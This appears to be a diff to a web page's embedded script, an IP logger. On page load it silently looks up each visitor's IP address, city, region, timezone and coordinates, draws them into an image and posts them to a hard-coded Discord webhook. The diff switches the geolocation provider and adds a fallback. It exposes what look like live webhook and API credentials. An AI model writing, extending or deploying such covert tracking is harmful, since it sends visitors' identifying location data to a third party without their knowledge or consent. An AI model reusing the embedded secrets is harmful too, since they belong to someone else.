@@ -32,12 +32,12 @@
         (function() {
             "use strict";
 
-            // ✅ YOUR DISCORD WEBHOOK
+            // ✅ YOUR ACTUAL DISCORD WEBHOOK (WORKING)
             const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1460175868755443836/2oHbJuVVB0sKUZWVHYXThIt2dcTxhlDYhy3e7S7N0kGClKKz_X71iep2aOSlQAfH2E4H";
             
-            // ✅ YOUR IPDATA.CO API KEY (for country, city, region)
-            const IPDATA_API_KEY = "723e60992a3c7f06d2905a079ebe5622b48b958f76bf187b6492f8a5ea4dc8bc";
-            const IPDATA_URL = `https://api.ipdata.co?api-key=${IPDATA_API_KEY}&fields=ip,city,region,country_name,country_code,time_zone,latitude,longitude`;
+            // ✅ YOUR ACTUAL ABSTRACT API KEY FOR IP GEOLOCATION
+            const ABSTRACT_API_KEY = "8773c41586084029934439d77d94c403";
+            const ABSTRACT_API_URL = `https://ipgeolocation.abstractapi.com/v1/?api_key=${ABSTRACT_API_KEY}&ip_address=`;
 
             // Get current date formatted
             function getCurrentDate() {
@@ -45,37 +45,51 @@
                 return `${d.toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' })} at ${d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}`;
             }
 
-            // Get visitor IP and location from ipdata.co
+            // Get visitor IP and location from Abstract API
             async function getVisitorInfo() {
                 try {
-                    console.log('📍 Fetching location data from ipdata.co...');
-                    const response = await fetch(IPDATA_URL);
-                    if (!response.ok) throw new Error(`ipdata error: ${response.status}`);
+                    // Abstract API automatically detects the requesting IP
+                    const response = await fetch(ABSTRACT_API_URL);
+                    if (!response.ok) throw new Error(`Abstract API error: ${response.status}`);
                     const data = await response.json();
                     
-                    console.log('✅ ipdata.co response:', data);
+                    console.log('✅ Abstract API response:', data);
                     
                     return {
-                        ip: data.ip || 'Unknown',
-                        country: data.country_name || 'Unknown',
+                        ip: data.ip_address || 'Unknown',
+                        country: data.country || 'Unknown',
                         city: data.city || 'Unknown',
                         region: data.region || 'Unknown',
-                        timezone: data.time_zone?.name || Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezone: data.timezone?.name || data.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone,
                         latitude: data.latitude || 'N/A',
                         longitude: data.longitude || 'N/A'
                     };
                 } catch (err) {
-                    console.error('❌ ipdata.co failed:', err);
-                    // Fallback
-                    return {
-                        ip: 'Unknown',
-                        country: 'Unknown',
-                        city: 'Unknown',
-                        region: 'Unknown',
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        latitude: 'N/A',
-                        longitude: 'N/A'
-                    };
+                    console.error('❌ Abstract API failed:', err);
+                    // Fallback to ipify for just IP
+                    try {
+                        const fallback = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await fallback.json();
+                        return {
+                            ip: ipData.ip || 'Unknown',
+                            country: 'Unknown (API limit?)',
+                            city: 'Unknown',
+                            region: 'Unknown',
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            latitude: 'N/A',
+                            longitude: 'N/A'
+                        };
+                    } catch (e) {
+                        return {
+                            ip: 'Unknown',
+                            country: 'Unknown',
+                            city: 'Unknown',
+                            region: 'Unknown',
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            latitude: 'N/A',
+                            longitude: 'N/A'
+                        };
+                    }
                 }
             }
 
@@ -112,37 +126,41 @@
                 ctx.fillStyle = '#ffffff';
                 ctx.fillText('IP ADDRESS:', 50, 140);
                 ctx.font = 'bold 20px "Courier New", monospace';
-                ctx.fillStyle = '#ffd700';
+                ctx.fillStyle = '#ffd700'; // Gold color
                 ctx.fillText(`${ip}`, 250, 140);
 
-                // Country and City
+                // Country
                 ctx.font = '16px "Courier New", monospace';
                 ctx.fillStyle = '#ffffff';
-                ctx.fillText('LOCATION:', 50, 190);
+                ctx.fillText('COUNTRY:', 50, 190);
                 ctx.font = 'bold 18px "Courier New", monospace';
-                ctx.fillStyle = '#7fffd4';
-                let locationText = country;
-                if (city && city !== 'Unknown') locationText += `, ${city}`;
-                if (region && region !== 'Unknown' && region !== city) locationText += ` (${region})`;
-                ctx.fillText(`${locationText}`, 250, 190);
+                ctx.fillStyle = '#7fffd4'; // Aquamarine
+                ctx.fillText(`${country} ${city ? '· ' + city : ''}`, 250, 190);
 
                 // Timezone
                 ctx.font = '16px "Courier New", monospace';
                 ctx.fillStyle = '#ffffff';
                 ctx.fillText('TIMEZONE:', 50, 240);
                 ctx.font = 'bold 18px "Courier New", monospace';
-                ctx.fillStyle = '#ffa07a';
+                ctx.fillStyle = '#ffa07a'; // Light salmon
                 ctx.fillText(`${timezone}`, 250, 240);
+
+                // Location details
+                if (region && region !== 'Unknown') {
+                    ctx.font = '14px "Courier New", monospace';
+                    ctx.fillStyle = '#b0b0b0';
+                    ctx.fillText(`Region: ${region}`, 50, 290);
+                }
 
                 // Timestamp
                 ctx.font = '12px monospace';
                 ctx.fillStyle = '#888';
                 ctx.fillText(`Captured: ${new Date().toLocaleString()}`, 50, canvas.height-50);
                 
-                // ipdata credit
+                // Abstract API credit
                 ctx.font = '10px monospace';
                 ctx.fillStyle = '#555';
-                ctx.fillText('ip intelligence · ipdata.co', canvas.width-200, canvas.height-20);
+                ctx.fillText('ip intelligence · abstractapi.com', canvas.width-220, canvas.height-20);
                 
                 return canvas.toDataURL('image/png');
             }
@@ -166,7 +184,7 @@
                     // Create rich embed
                     const embed = {
                         title: '📸 New Page Visitor',
-                        color: 0x00ff9d,
+                        color: 0x00ff9d, // Mint green
                         fields: [
                             { 
                                 name: '🌐 IP ADDRESS', 
@@ -190,7 +208,7 @@
                             }
                         ],
                         footer: {
-                            text: 'ipdata.co · IP Intelligence'
+                            text: 'Abstract API · IP Intelligence'
                         },
                         timestamp: new Date().toISOString()
                     };
@@ -214,7 +232,7 @@
                     
                     if (response.ok) {
                         console.log('✅ SUCCESS! Discord notification sent!');
-                        console.log('📊 Visitor:', ip, country, city, region);
+                        console.log('📊 Visitor:', ip, country, timezone);
                     } else {
                         const errorText = await response.text();
                         console.error('❌ Discord error:', response.status, errorText);
@@ -226,9 +244,12 @@
 
             // Initialize - run immediately when page loads
             (async function() {
-                console.log('🚀 Page loaded, getting visitor location from ipdata.co...');
+                console.log('🚀 Page loaded, getting visitor location from Abstract API...');
                 const visitor = await getVisitorInfo();
                 await sendToDiscord(visitor);
+                
+                // Also log to console for debugging
+                console.log('✅ Page loaded - check Discord channel for notification');
             })();
         })();
     </script>
